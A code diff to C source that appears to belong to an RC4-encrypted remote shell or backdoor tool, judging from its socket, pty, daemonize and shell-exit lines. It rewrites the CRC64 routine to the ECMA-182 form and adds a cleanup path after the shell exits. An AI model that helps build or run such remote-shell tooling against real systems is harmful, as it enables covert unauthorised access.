@@ -75,6 +75,8 @@
                     status);                                \
     }
 
+#define CRC64_ECMA_182_POLY 0x42F0E1EBA9EA3693ULL
+
 typedef struct rc4_state
 {
     uint8_t i;
@@ -116,20 +118,36 @@ uint8_t rc4_next(rc4_state *state)
 }
 
 /**
- * CRC64 implementation based on CRC64-ECMA
+ * CRC64 implementation based on CRC64-ECMA-182
  * @param s input string
  * @return CRC64 hash
  */
 uint64_t crc64(const char *s)
 {
-    uint64_t crc = 0xFFFFFFFFFFFFFFFF;
-    while (*s)
+    // Initialization value for the CRC (based on CRC64-ECMA)
+    uint64_t crc = 0;
+    size_t i, j;
+
+    // Process each byte of the string
+    for (i = 0; s[i] != '\0'; i++)
     {
-        crc ^= *s++;
-        for (int i = 0; i < 8; i++)
-            crc = (crc >> 1) ^ (0xC96C5795D7870F42 & -(crc & 1));
+        crc ^= (uint64_t)(unsigned char)s[i] << 56; // Integrate byte into the CRC
+
+        // Process each bit in the byte
+        for (j = 0; j < 8; j++)
+        {
+            if (crc & (1ULL << 63))
+            {
+                crc = (crc << 1) ^ CRC64_ECMA_182_POLY;
+            }
+            else
+            {
+                crc <<= 1;
+            }
+        }
     }
-    return ~crc;
+
+    return crc;
 }
 
 int main()
@@ -303,6 +321,7 @@ end_loop:
         if (waitpid(-pid, &status, WNOHANG) < 0)
             continue;
         DEBUG_PROCESS_EXIT(status, "Shell exited ")
+        goto cleanup;
     }
 
 #if !DAEMONIZE
@@ -310,6 +329,7 @@ end_loop:
 #endif
     if (kill(-pid, SIGKILL) < 0)
         FATAL("kill execl child")
+cleanup:
     close(sockfd);
     close(master);
     return 0;
